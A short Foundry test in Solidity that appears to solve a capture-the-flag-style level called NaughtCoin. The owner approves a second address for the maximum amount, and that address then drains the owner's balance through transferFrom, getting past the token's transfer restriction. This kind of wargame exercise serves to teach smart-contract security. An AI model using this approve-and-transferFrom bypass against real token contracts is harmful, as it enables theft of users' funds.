// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin private ncoin;
    address private constant ALICE = address(0x1);
    address private constant BOB = address(0x3);

    function setUp() external {
        vm.deal(ALICE, 10e18);
        vm.deal(BOB, 1e18);
        vm.startPrank(ALICE);
        ncoin = new NaughtCoin(ALICE);
    }

    function testHack() external {
        ncoin.approve(BOB, ~uint(0));
        vm.stopPrank();

        vm.startPrank(BOB);
        uint balance = ncoin.balanceOf(ALICE);
        ncoin.transferFrom(ALICE, BOB, balance);
        assertEq(ncoin.balanceOf(ALICE), 0);
    }
}